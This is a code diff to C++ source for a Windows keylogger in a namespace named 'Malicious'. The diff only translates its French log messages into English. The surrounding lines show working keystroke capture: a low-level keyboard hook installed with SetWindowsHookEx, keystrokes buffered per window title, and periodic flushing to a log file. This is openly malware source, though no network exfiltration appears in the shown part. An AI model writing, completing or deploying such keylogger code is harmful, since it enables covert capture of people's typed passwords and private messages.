@@ -166,9 +166,9 @@ namespace Malicious
             hThread = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)MsgLoop, 0, 0, &dwThread);
 		    if(hThread == NULL)
 		    {
-			    LOG << "Echec CreateThread : " + to_string(GetLastError());
+			    LOG << "CreateThreadfailed : " + to_string(GetLastError());
 		    }
-            LOG << "Activation du keylogger.";
+            LOG << "Keylogging enabled";
             isActivated = true;
         }
     }
@@ -180,14 +180,14 @@ namespace Malicious
         {
             if(!TerminateThread(hThread, 0))
 		    {
-			    LOG << "Echec TerminateThread : " + to_string(GetLastError());
+			    LOG << "TerminateThread failed : " + to_string(GetLastError());
 		    }
 
             if(!UnhookWindowsHookEx(hook))
 		    {
-			    LOG << "Echec UnhookWindowsHookEx : " + to_string(GetLastError());
+			    LOG << "UnhookWindowsHookEx failed : " + to_string(GetLastError());
 		    }
-            LOG << "Desactivation du keylogger.";
+            LOG << "Keylogging disabled";
             isActivated = false;
         }
     }
@@ -203,7 +203,7 @@ namespace Malicious
         log.open(log_file.c_str(), std::ios::app);
         if(log)
         {
-            LOG << "Flushing.";
+            LOG << "Flushing";
             for(std::map<std::string, std::string>::iterator iter = log_buffer.begin();
                 iter != log_buffer.end();
                 iter++)
@@ -217,7 +217,7 @@ namespace Malicious
             
             if(filesize >= LOGFILE_MAX_SIZE)
             {
-                LOG << "La taille maximale du fichier log a ete atteinte. Effacement.";
+                LOG << "Log file is full. Effacement.";
                 clearKeylog();
             }
         }
@@ -233,7 +233,7 @@ namespace Malicious
         updateWindowTitle();
         log_buffer[window] += key;
 		buffered_char++;
-		LOG << "Touche : " + to_string(key) + " <=> " + window + " et buffer = " + to_string(buffered_char);
+		LOG << "Key : " + to_string(key) + " <=> " + window + ", buffer = " + to_string(buffered_char);
 		if(buffered_char >= MAX_BUFFERED)
 		{
 			flush();
@@ -247,7 +247,7 @@ namespace Malicious
         Keylogger::instance().hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyloggingProc, GetModuleHandle(0), 0);
 		if(Keylogger::instance().hook == NULL)
 		{
-			LOG << "Echec SetWindowsHookEx " + to_string(GetLastError());
+			LOG << "SetWindowsHookEx failed : " + to_string(GetLastError());
         }
 
         MSG message;
